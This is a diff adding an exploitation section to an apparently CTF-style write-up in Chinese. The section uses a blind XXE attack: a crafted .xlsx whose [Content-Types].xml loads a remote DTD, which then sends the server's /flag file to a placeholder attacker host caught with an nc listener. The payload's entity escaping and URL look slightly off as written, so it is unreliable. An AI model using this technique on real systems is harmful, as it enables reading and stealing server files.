@@ -231,4 +231,25 @@ if (filename.startsWith("excel-") && "xlsx".equals(fileExtName)) {
     }
 }
 ```
+利用：
+本地新建.xlsx文件，修改后缀名.zip，打开压缩包，其中有[Content-Types].xml文件。
+修改[Content-Types].xml，第二行添加如下内容，保存。
+```
+<!DOCTYPE convert [
+<!ENTITY % remote SYSTEM "http://远程服务器/xxx.dtd">
+%remote;%int;%send;
+]>
+```
+将修改后的压缩包重新修改后缀为.xlsx文件。
 
+
+进入远程服务器WEB根目录，创建文件xxx.dtd，添加内容
+```
+<!ENTITY % file SYSTEM "file:///flag">
+<!ENTITY % int "<!ENTITY % send SYSTEM '远程服务器IP:2333/%file;'>">
+```
+启动监控 ：nc -lvvp 2333
+
+
+上传.xlsx文件，此时自动解析触发XXE外部实体注入。
+查看nc监听结果，读取到文件flag。
